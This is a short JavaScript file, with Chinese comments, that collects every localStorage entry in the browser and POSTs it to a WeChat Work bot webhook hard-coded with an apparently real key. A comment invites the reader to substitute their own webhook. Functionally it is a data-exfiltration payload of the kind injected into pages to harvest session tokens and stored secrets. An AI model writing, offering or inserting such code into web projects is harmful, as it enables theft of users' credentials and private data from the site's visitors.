// 文件: aaa.js
function getAllLocalStorageData() {
    let data = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data[key] = localStorage.getItem(key);
    }
    return data;
}

function sendToWeChatWorkBot(webhookUrl, data) {
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            msgtype: 'text',
            text: {
                content: JSON.stringify(data, null, 2)
            }
        })
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));
}

function main() {
    const webhookUrl = 'https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=44f76713-872b-4a36-ae90-e22ad1671fd6'; // 替换为您的企业微信机器人Webhook URL
    const localStorageData = getAllLocalStorageData();
    sendToWeChatWorkBot(webhookUrl, localStorageData);
}
